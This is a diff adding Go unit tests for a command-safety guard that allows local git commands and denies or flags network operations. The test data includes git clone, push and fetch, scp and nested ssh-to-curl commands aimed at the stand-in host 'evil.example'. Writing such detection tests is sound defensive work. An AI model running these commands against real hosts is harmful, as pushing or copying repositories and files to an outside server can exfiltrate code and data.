@@ -12,6 +12,7 @@ package safety
 import (
 	"context"
 	"runtime"
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/require"
@@ -60,6 +61,101 @@ func TestNetworkRuleClassifiesNonURLTargets(t *testing.T) {
 	}
 }
 
+func TestNetworkRuleClassifiesGitSubcommands(t *testing.T) {
+	guard := newNetworkTestGuard(t)
+	for _, command := range []string{
+		"git status",
+		"git log",
+		"git diff",
+		"git show HEAD",
+		"git branch",
+		"git tag",
+		"git rev-parse HEAD",
+	} {
+		report, err := guard.Scan(context.Background(), scanCommand(command))
+		require.NoError(t, err)
+		require.Equal(t, DecisionAllow, report.Decision, command)
+	}
+	for _, command := range []string{
+		"git clone https://evil.example/repo",
+		"git fetch https://evil.example/repo",
+		"git pull https://evil.example/repo",
+		"git push https://evil.example/repo",
+		"git ls-remote https://evil.example/repo",
+		"git submodule add https://evil.example/repo",
+		"git archive --remote=evil.example:/repo HEAD",
+	} {
+		report, err := guard.Scan(context.Background(), scanCommand(command))
+		require.NoError(t, err)
+		require.NotEqual(t, DecisionAllow, report.Decision, command)
+	}
+}
+
+func TestNetworkRuleClassifiesGitBoundaryForms(t *testing.T) {
+	guard := newNetworkTestGuard(t)
+	for _, command := range []string{
+		"git remote",
+		"git --version",
+		"git remote add origin https://evil.example/repo",
+	} {
+		report, err := guard.Scan(context.Background(), scanCommand(command))
+		require.NoError(t, err)
+		require.Equal(t, DecisionAllow, report.Decision, command)
+	}
+	for _, test := range []struct {
+		command string
+		ruleID  string
+	}{
+		{"git -c core.askPass=true status", "NETWORK_OPTION_REVIEW"},
+		{"git unknown https://evil.example/repo", "NETWORK_DOMAIN_DENIED"},
+		{"git clone -- https://evil.example/repo", "NETWORK_DOMAIN_DENIED"},
+	} {
+		t.Run(test.command, func(t *testing.T) {
+			report, err := guard.Scan(context.Background(), scanCommand(test.command))
+			require.NoError(t, err)
+			require.NotEqual(t, DecisionAllow, report.Decision)
+			requireFinding(t, report, test.ruleID)
+		})
+	}
+}
+
+func TestNetworkRuleReviewsGitGlobalPathAndConfigOptions(t *testing.T) {
+	guard := newNetworkTestGuard(t)
+	for _, command := range []string{
+		"git -C repo status",
+		"git --git-dir repo status",
+		"git --work-tree=repo status",
+		"git --config-env credential.helper=HELPER status",
+	} {
+		report, err := guard.Scan(context.Background(), scanCommand(command))
+		require.NoError(t, err)
+		require.NotEqual(t, DecisionAllow, report.Decision, command)
+		requireFinding(t, report, "NETWORK_OPTION_REVIEW")
+	}
+}
+
+func TestNetworkRuleMatchesWildcardDomains(t *testing.T) {
+	policy := DefaultPolicy()
+	policy.allowedCommands = []string{"curl"}
+	policy.deniedCommands = nil
+	policy.allowedDomains = []string{"*.trusted.example"}
+	guard, err := NewGuard(policy)
+	require.NoError(t, err)
+
+	report, err := guard.Scan(
+		context.Background(), scanCommand("curl api.trusted.example"),
+	)
+	require.NoError(t, err)
+	require.Equal(t, DecisionAllow, report.Decision)
+
+	report, err = guard.Scan(
+		context.Background(), scanCommand("curl trusted.example"),
+	)
+	require.NoError(t, err)
+	require.Equal(t, DecisionDeny, report.Decision)
+	requireFinding(t, report, "NETWORK_DOMAIN_DENIED")
+}
+
 func TestNetworkRuleFailsClosedForAmbiguousTargets(t *testing.T) {
 	guard := newNetworkTestGuard(t)
 	tests := []struct {
@@ -94,6 +190,52 @@ func TestNetworkRuleFailsClosedForAmbiguousTargets(t *testing.T) {
 			require.NotEqual(t, DecisionAllow, report.Decision)
 			requireFinding(t, report, test.ruleID)
 		})
+	}
+}
+
+func TestNetworkRuleRejectsMalformedAndLiteralTargets(t *testing.T) {
+	guard := newNetworkTestGuard(t)
+	for _, test := range []struct {
+		command string
+		ruleID  string
+	}{
+		{`curl ""`, "NETWORK_TARGET_UNPARSABLE"},
+		{`curl "host name with spaces"`, "NETWORK_TARGET_UNPARSABLE"},
+		{`curl [::1]`, "NETWORK_TARGET_UNPARSABLE"},
+		{`curl https://[::1]/path`, "NETWORK_IP_LITERAL"},
+		{`curl https://192.0.2.1/path`, "NETWORK_IP_LITERAL"},
+		{`curl https://evil.example./path`, "NETWORK_DOMAIN_DENIED"},
+	} {
+		report, err := guard.Scan(
+			context.Background(), scanCommand(test.command),
+		)
+		require.NoError(t, err)
+		require.NotEqual(t, DecisionAllow, report.Decision, test.command)
+		requireFinding(t, report, test.ruleID)
+	}
+}
+
+func TestNetworkRuleReviewsIncompleteOptions(t *testing.T) {
+	guard := newNetworkTestGuard(t)
+	for _, test := range []struct {
+		command string
+		ruleID  string
+	}{
+		{"curl --proxy", "NETWORK_OPTION_REVIEW"},
+		{"curl -x", "NETWORK_OPTION_REVIEW"},
+		{"ssh -o", "NETWORK_OPTION_REVIEW"},
+		{"scp -S", "NETWORK_OPTION_REVIEW"},
+		{"git clone --config", "NETWORK_OPTION_REVIEW"},
+		{"git fetch --upload-pack", "NETWORK_OPTION_REVIEW"},
+		{"git push --receive-pack", "NETWORK_OPTION_REVIEW"},
+		{"git archive --remote", "NETWORK_TARGET_UNPARSABLE"},
+	} {
+		report, err := guard.Scan(
+			context.Background(), scanCommand(test.command),
+		)
+		require.NoError(t, err)
+		require.NotEqual(t, DecisionAllow, report.Decision, test.command)
+		requireFinding(t, report, test.ruleID)
 	}
 }
 
@@ -142,6 +284,17 @@ func TestNetworkRuleChecksEveryLiteralTarget(t *testing.T) {
 	requireFinding(t, report, "NETWORK_DOMAIN_DENIED")
 }
 
+func TestNetworkRuleChecksEverySCPRemoteTarget(t *testing.T) {
+	guard := newNetworkTestGuard(t)
+	report, err := guard.Scan(
+		context.Background(),
+		scanCommand("scp file user@api.github.com:/tmp/a user@evil.example:/tmp/b ."),
+	)
+	require.NoError(t, err)
+	require.Equal(t, DecisionDeny, report.Decision)
+	requireFinding(t, report, "NETWORK_DOMAIN_DENIED")
+}
+
 func TestNetworkRuleReviewOptionsDoNotHideDeniedTargets(t *testing.T) {
 	guard := newNetworkTestGuard(t)
 	commands := []string{
@@ -181,6 +334,16 @@ func TestNetworkRuleReviewsSSHRemoteShellWrapper(t *testing.T) {
 		require.NotEqual(t, DecisionAllow, report.Decision)
 		requireFinding(t, report, "NETWORK_OPTION_REVIEW")
 	}
+}
+
+func TestNetworkRuleBoundsNestedSSHInspection(t *testing.T) {
+	guard := newNetworkTestGuard(t)
+	command := strings.Repeat("ssh api.github.com ", maxNestedNetworkDepth+1) +
+		"curl evil.example"
+	report, err := guard.Scan(context.Background(), scanCommand(command))
+	require.NoError(t, err)
+	require.NotEqual(t, DecisionAllow, report.Decision)
+	requireFinding(t, report, "NETWORK_OPTION_REVIEW")
 }
 
 func TestNetworkRuleHandlesSCPDrivePathByPlatform(t *testing.T) {
